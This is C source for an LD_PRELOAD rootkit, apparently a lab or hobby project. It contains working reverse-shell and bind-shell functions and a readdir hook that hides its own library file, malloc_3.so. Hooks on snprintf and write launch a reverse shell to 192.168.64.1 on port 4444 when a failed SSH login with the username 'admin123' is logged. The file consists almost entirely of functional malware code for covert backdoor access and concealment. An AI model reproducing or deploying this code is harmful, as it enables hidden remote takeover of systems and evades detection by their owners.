#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define host "192.168.64.1"
#define FILENAME "malloc_3.so"
#define LISTENING_PORT 4444
#define TRIGGER_1 "Invalid user admin123"
#define TRIGGER_2 "Invalid user user123"
#define TRIGGER_3 "Invalid user clear123"


//reverse shell implementation
int rev_shell()
{
    int sock;
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4444);
    inet_aton(host, &serv_addr.sin_addr);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}


//bind shell implementation
int bind_shell()
{
    struct sockaddr_in serv_addr;
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LISTENING_PORT);
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    bind(sock_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    listen(sock_fd, 5);

    int client_fd = accept(sock_fd, NULL, NULL);
    dup2(client_fd, 0);
    dup2(client_fd, 1);
    dup2(client_fd, 2);

    char *const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    close(sock_fd);

    return 0;
}


//function pointer to the original readdir
struct dirent* (*original_readdir)(DIR *) = NULL;

//DIR* is a stream of the files as entries from the directory 
struct dirent *readdir(DIR *dirp)
{
    if (original_readdir == NULL)
    {
        //finds the offset of the next occurence of readdir
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *results = original_readdir(dirp);
    while (results != NULL && !strncmp(results->d_name, FILENAME, strlen(FILENAME)))
    {
        //move onto the next entry in the stream
        results = original_readdir(dirp);
    }

    return results;
}

//hooking snprintf to trigger shells upoin failed ssh login attempts
int snprintf(char *str, size_t size, const char *format, ...)
{
    printf("Hooking snprintf\n");
    int (*new_snprintf)(char *str, size_t size, const char *format, ...);
    int ret;
    new_snprintf = dlsym(RTLD_NEXT, "snprintf");

    va_list func_args;
    va_start(func_args, format);
    const char *buffer = va_arg(func_args, const char*);

    char *trigger_found = strstr(buffer, TRIGGER_1);
    if (trigger_found != NULL)
    {
	    ret = new_snprintf(str, size, format, func_args);
	    rev_shell();
    }

    else
    {
	    ret = new_snprintf(str, size, format, func_args);
    }

    va_end(func_args);
    return ret;
}

//testing write hook
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    printf("Hooking write\n");

    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
    ssize_t result;
    new_write = dlsym(RTLD_NEXT, "write");

    char *trigger_found = strstr(buf, TRIGGER_1);
    if (trigger_found != NULL)
    {
        printf("running reverse shell\n");
	    result = new_write(fildes, buf, nbytes);
	    rev_shell();
    }

    else
    {
        result = new_write(fildes, buf, nbytes);
    }

    return result;
}
